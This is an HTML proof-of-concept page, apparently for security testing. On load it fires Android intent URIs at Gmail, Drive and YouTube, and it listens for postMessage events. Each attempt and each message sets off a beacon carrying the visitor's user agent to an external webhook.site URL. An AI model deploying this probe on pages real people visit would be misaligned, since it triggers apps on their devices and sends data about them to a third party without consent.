<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Google Apps Intent PoC</title>
</head>
<body>
<h3>Intent PoC Running...</h3>

<script>
const WEBHOOK = "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d";

function report(data) {
    const payload = encodeURIComponent(JSON.stringify({
        time: Date.now(),
        ua: navigator.userAgent,
        ...data
    }));

    const img = new Image();
    img.src = WEBHOOK + "?d=" + payload;
}

// 🎯 Target apps (Google only)
const targets = [
    {
        app: "Gmail",
        intent: "intent://compose?to=test@example.com#Intent;scheme=mailto;package=com.google.android.gm;end"
    },
    {
        app: "Drive",
        intent: "intent://open?id=123#Intent;scheme=https;package=com.google.android.apps.docs;end"
    },
    {
        app: "YouTube",
        intent: "intent://watch?v=dQw4w9WgXcQ#Intent;scheme=https;package=com.google.android.youtube;end"
    }
];

// 🔥 Trigger satu per satu (biar tidak ketabrak)
function runTests(index = 0) {
    if (index >= targets.length) return;

    const t = targets[index];

    try {
        report({ app: t.app, event: "intent_attempt" });

        // trigger intent
        window.location.href = t.intent;

        // fallback logging
        setTimeout(() => {
            report({ app: t.app, event: "intent_timeout" });
            runTests(index + 1);
        }, 3000);

    } catch (e) {
        report({ app: t.app, event: "intent_error" });
        runTests(index + 1);
    }
}

// 🔍 postMessage probe
window.addEventListener("message", (evt) => {
    report({
        app: "GLOBAL",
        event: "postMessage_received",
        origin: evt.origin,
        data: typeof evt.data
    });
}, false);

window.onload = () => {
    runTests();
};
</script>

<p>Check webhook for logs.</p>
</body>
</html>
